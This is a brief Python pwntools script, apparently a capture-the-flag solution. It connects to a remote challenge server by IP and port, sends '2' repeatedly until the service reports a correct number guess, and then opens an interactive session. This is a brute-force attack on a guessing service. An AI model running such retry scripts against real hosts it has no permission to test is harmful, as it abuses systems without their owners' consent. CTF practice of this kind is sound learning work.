from pwn import *
context(log_level='debug',os='linux',arch='amd64')


# io=process("./zzzzz")
io=remote("43.142.108.3",28524)
while 1:
    io.sendline(b"2")
    if io.recv()==(b"Congratulations! You guessed the number correctly.\n"):
        break

io.interactive()